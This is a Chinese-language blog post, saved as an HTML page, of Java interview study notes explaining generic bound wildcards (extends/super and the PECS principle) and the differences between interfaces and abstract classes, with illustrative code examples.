<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Java基础面试-2 | Leo's Digital Genesis</title><meta name="author" content="Leonardo"><meta name="copyright" content="Leonardo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="✅泛型中上下界限定符extends 和 super有什么区别？ 典型回答 extends   表示类型的上界，表示参数化类型的可能是T 或是 T的子类  1 2 3 4 5 6   &#x2F;&#x2F; 定义一个泛型方法，接受任何继承自Number的类型 public  void processNumber(T number) {     &#x2F;&#x2F; 在这个方法中，可以安全地调用Number的方法     double">
<meta property="og:type" content="article">
<meta property="og:title" content="Java基础面试-2">
<meta property="og:url" content="https://cherises.github.io/post/34319/index.html">
<meta property="og:site_name" content="Leo&#39;s Digital Genesis">
<meta property="og:description" content="✅泛型中上下界限定符extends 和 super有什么区别？ 典型回答 extends   表示类型的上界，表示参数化类型的可能是T 或是 T的子类  1 2 3 4 5 6   &#x2F;&#x2F; 定义一个泛型方法，接受任何继承自Number的类型 public  void processNumber(T number) {     &#x2F;&#x2F; 在这个方法中，可以安全地调用Number的方法     double">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/genshin/emoj/136.png">
<meta property="article:published_time" content="2025-11-01T21:26:46.000Z">
<meta property="article:modified_time" content="2025-11-01T14:16:45.699Z">
<meta property="article:author" content="Leonardo">
<meta property="article:tag" content="Artificial Intelligence">
<meta property="article:tag" content="Quantum Computing">
<meta property="article:tag" content="Neural Networks">
<meta property="article:tag" content="Future Tech">
<meta property="article:tag" content="Digital Philosophy">
<meta property="article:tag" content="Cybersecurity">
<meta property="article:tag" content="Blockchain">
<meta property="article:tag" content="Metaverse">
<meta property="article:tag" content="Algorithmic Ethics">
<meta property="article:tag" content="Space Technology">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/genshin/emoj/136.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Java基础面试-2",
  "url": "https://cherises.github.io/post/34319/",
  "image": "https://raw.githubusercontent.com/Cherises/Blog-Resource-2/refs/heads/main/photos/genshin/emoj/136.png",
  "datePublished": "2025-11-01T21:26:46.000Z",
  "dateModified": "2025-11-01T14:16:45.699Z",
  "author": [
    {
      "@type": "Person",
      "name": "Leonardo",
      "url": "https://github.com/Cherises/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://cherises.github.io/post/34319/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":5,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-center"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Java基础面试-2',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/admonition.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@mdi/font/css/materialdesignicons.min.css"><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg" style="background-image: url(/img/b3.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/actor-1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">108</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">149</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">23</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/Wujie/"><i class="fa-fw fas fa-globe"></i><span> WuJie</span></a></div><div class="menus_item"><a class="site-page" href="/Music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div><div class="menus_item"><a class="site-page" href="/About/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Leo's Digital Genesis</span></a><a class="nav-page-title" href="/"><span class="site-name">Java基础面试-2</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/Wujie/"><i class="fa-fw fas fa-globe"></i><span> WuJie</span></a></div><div class="menus_item"><a class="site-page" href="/Music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></div><div class="menus_item"><a class="site-page" href="/About/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Java基础面试-2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-01T21:26:46.000Z" title="Created 2025-11-01 21:26:46">2025-11-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-01T14:16:45.699Z" title="Updated 2025-11-01 14:16:45">2025-11-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/study/">study</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/study/Java%E9%9D%A2%E8%AF%95/">Java面试</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/study/Java%E9%9D%A2%E8%AF%95/Java%E5%9F%BA%E7%A1%80/">Java基础</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">34.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>123mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><h1 id="✅泛型中上下界限定符extends-和-super有什么区别？"><a href="#✅泛型中上下界限定符extends-和-super有什么区别？" class="headerlink" title="✅泛型中上下界限定符extends 和 super有什么区别？"></a>✅泛型中上下界限定符extends 和 super有什么区别？</h1><h2 id="典型回答"><a href="#典型回答" class="headerlink" title="典型回答"></a>典型回答</h2><h3 id="extends"><a href="#extends" class="headerlink" title="extends"></a>extends</h3><p> <code>&lt;? extends T&gt;</code> 表示类型的上界，表示参数化类型的可能是T 或是 T的子类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个泛型方法，接受任何继承自Number的类型</span></span><br><span class="line"><span class="keyword">public</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Number</span>&gt; <span class="keyword">void</span> <span class="title function_">processNumber</span><span class="params">(T number)</span> &#123;</span><br><span class="line">    <span class="comment">// 在这个方法中，可以安全地调用Number的方法</span></span><br><span class="line">    <span class="type">double</span> <span class="variable">value</span> <span class="operator">=</span> number.doubleValue();</span><br><span class="line">    <span class="comment">// 其他操作...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>举个例子，假设我们有一个基本类 <code>Animal</code> 和两个子类 <code>Dog</code> 和 <code>Cat</code>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">makeSound</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bark</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">meow</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>我们可以使用 <code>extends</code> 限定符来定义一个泛型方法，只允许传入 <code>Animal</code> 或其子类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenericExample</span> &#123;</span><br><span class="line">    <span class="comment">// 泛型方法，类型参数 T 必须是 Animal 或 Animal 的子类</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Animal</span>&gt; <span class="keyword">void</span> <span class="title function_">processAnimal</span><span class="params">(T animal)</span> &#123;</span><br><span class="line">        animal.makeSound();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">GenericExample</span> <span class="variable">example</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GenericExample</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        <span class="type">Cat</span> <span class="variable">cat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cat</span>();</span><br><span class="line"></span><br><span class="line">        example.processAnimal(dog); <span class="comment">// 合法</span></span><br><span class="line">        example.processAnimal(cat); <span class="comment">// 合法</span></span><br><span class="line">        <span class="comment">// example.processAnimal(new String()); // 编译错误</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="super"><a href="#super" class="headerlink" title="super"></a>super</h3><p><code>&lt;? super T&gt;</code> 表示类型下界（Java Core中叫超类型限定），表示参数化类型是此类型的超类型（父类型），直至Object</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个泛型方法，接受任何类型的List，并向其中添加元素</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; <span class="keyword">void</span> <span class="title function_">addElements</span><span class="params">(List&lt;? <span class="built_in">super</span> T&gt; list, T element)</span> &#123;</span><br><span class="line">    list.add(element);</span><br><span class="line">    <span class="comment">// 其他操作...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>假设我们需要定义一个方法，向一个 <code>List</code> 中插入元素，这个 <code>List</code> 的泛型类型可以是某个类或该类的父类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenericExample</span> &#123;</span><br><span class="line">    <span class="comment">// 泛型方法，类型参数 T 必须是 Number 或 Number 的父类</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; <span class="keyword">void</span> <span class="title function_">addNumberToList</span><span class="params">(List&lt;? <span class="built_in">super</span> T&gt; list, T number)</span> &#123;</span><br><span class="line">        list.add(number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">GenericExample</span> <span class="variable">example</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GenericExample</span>();</span><br><span class="line"></span><br><span class="line">    List&lt;Number&gt; numberList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    example.addNumberToList(numberList, <span class="number">10</span>); <span class="comment">// 合法，Integer 是 Number 的子类</span></span><br><span class="line">    example.addNumberToList(numberList, <span class="number">10.5</span>); <span class="comment">// 合法，Double 是 Number 的子类</span></span><br><span class="line"></span><br><span class="line">    example.addNumberToList(numberList, <span class="string">&quot;Hello&quot;</span>); <span class="comment">// 编译错误，String 不是 Number 的子类</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="PECS-原则"><a href="#PECS-原则" class="headerlink" title="PECS 原则"></a>PECS 原则</h3><p>在使用 限定通配符的时候，需要遵守<strong>PECS原则</strong>，即Producer Extends, Consumer Super；上界生产，下界消费。</p>
<p>如果要从集合中读取类型T的数据，并且不能写入，可以使用 ? extends 通配符；(Producer Extends)，如上面的processNumber方法。</p>
<p>如果要从集合中写入类型T的数据，并且不需要读取，可以使用 ? super 通配符；(Consumer Super)，如上面的addElements方法</p>
<blockquote>
<p>extend的时候是可读取不可写入，那为什么叫上界生产呢？<br>因为这个消费者&#x2F;生产者描述的&lt;集合&gt;，当我们从集合读取的时候，集合是生产者。</p>
</blockquote>
<p>如果既要存又要取，那么就不要使用任何通配符。</p>
<p>综合示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenericBoundsExample</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 extends 限定符来读取泛型类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;T&gt;&gt; T <span class="title function_">findMax</span><span class="params">(List&lt;T&gt; list)</span> &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">max</span> <span class="operator">=</span> list.get(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (T element : list) &#123;</span><br><span class="line">            <span class="keyword">if</span> (element.compareTo(max) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                max = element;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 super 限定符来写入泛型类型</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="keyword">void</span> <span class="title function_">addElement</span><span class="params">(List&lt;? <span class="built_in">super</span> T&gt; list, T element)</span> &#123;</span><br><span class="line">        list.add(element);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; intList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        addElement(intList, <span class="number">5</span>); <span class="comment">// Integer 是 Number 的子类</span></span><br><span class="line"></span><br><span class="line">        List&lt;Number&gt; numberList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        addElement(numberList, <span class="number">5</span>); <span class="comment">// Integer 是 Number 的子类</span></span><br><span class="line">        addElement(numberList, <span class="number">5.5</span>); <span class="comment">// Double 是 Number 的子类</span></span><br><span class="line"></span><br><span class="line">        List&lt;String&gt; stringList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// addElement(stringList, 5); // 编译错误，Integer 不是 String 的子类</span></span><br><span class="line"></span><br><span class="line">        List&lt;Integer&gt; integers = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        integers.add(<span class="number">3</span>);</span><br><span class="line">        integers.add(<span class="number">7</span>);</span><br><span class="line">        integers.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">max</span> <span class="operator">=</span> findMax(integers);</span><br><span class="line">        System.out.println(<span class="string">&quot;Max: &quot;</span> + max); <span class="comment">// Max: 7</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="✅接口和抽象类的区别，如何选择？"><a href="#✅接口和抽象类的区别，如何选择？" class="headerlink" title="✅接口和抽象类的区别，如何选择？"></a>✅接口和抽象类的区别，如何选择？</h1><h2 id="典型回答-1"><a href="#典型回答-1" class="headerlink" title="典型回答"></a>典型回答</h2><p>接口（Interface）和抽象类（Abstract Class）是面向对象编程中两个非常重要的概念，它们都可以用来实现抽象层。</p>
<p>接口：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PayService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pay</span><span class="params">(PayRequest payRequest)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>抽象类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractPayService</span> <span class="keyword">implements</span> <span class="title class_">PayService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pay</span><span class="params">(PayRequest payRequest)</span> &#123;</span><br><span class="line">      	<span class="comment">//前置检查</span></span><br><span class="line">        validateRequest(payRequest);</span><br><span class="line">      	<span class="comment">//支付核心逻辑</span></span><br><span class="line">        doPay(payRequest);</span><br><span class="line">      	<span class="comment">//后置处理</span></span><br><span class="line">        postPay(payRequest);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">doPay</span><span class="params">(PayRequest payRequest)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">postPay</span><span class="params">(PayRequest payRequest)</span> &#123;</span><br><span class="line">        <span class="comment">//支付成功的后置处理</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">validateRequest</span><span class="params">(PayRequest payRequest)</span> &#123;</span><br><span class="line">        <span class="comment">//参数检查</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>接口和抽象类的区别其实挺多的。比如以下这些：</p>
<p>**方法定义：**接口和抽象类，最明显的区别就是接口只是定义了一些方法而已，在不考虑Java8中default方法情况下，接口中只有抽象方法，是没有实现的代码的。（Java8中可以有默认方法）</p>
<p><strong>修饰符</strong>：抽象类中的修饰符可以有public、protected和private和<default>这些修饰符，而接口中默认修饰符是public。不可以使用其它修饰符。（接口中，如果定义了成员变量，还必须要初始化）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String b;</span><br><span class="line"></span><br><span class="line">    String c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> String d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>构造器</strong>：抽象类可以有构造器。接口不能有构造器。</p>
<blockquote>
<p>抽象类不能直接被实例化 new 出来，但是构造器也是有意义的，能起到初始化共有成员变量、强制初始化操作等作用。</p>
</blockquote>
<p><strong>继承和实现</strong>：接口可以被实现，抽象类可以被继承。</p>
<p><strong>单继承，多实现</strong>：一个类可以实现多个接口，但只能继承一个抽象类。接口支持多重继承，即一个接口可以继承多个其他接口。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">HollisTestService</span> <span class="keyword">extends</span> <span class="title class_">InitializingBean</span>, DisposableBean &#123;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>职责不同</strong>：接口和抽象类的职责不一样。<strong>接口主要用于制定规范</strong>，因为我们提倡也经常使用的都是面向接口编程。<strong>而抽象类主要目的是为了复用</strong>，比较典型的就是模板方法模式。</p>
<p><strong>所以当我们想要定义标准、规范的时候，就使用接口。当我们想要复用代码的时候，就使用抽象类。</strong></p>
<p>一般在实际开发中，我们会先把接口暴露给外部，然后在业务代码中实现接口。如果多个实现类中有相同可复用的代码，则在接口和实现类中间加一层抽象类，将公用部分代码抽出到抽象类中。可以参考下模板方法模式，这是一个很好的理解接口、抽象类和实现类之间关系的设计模式。</p>
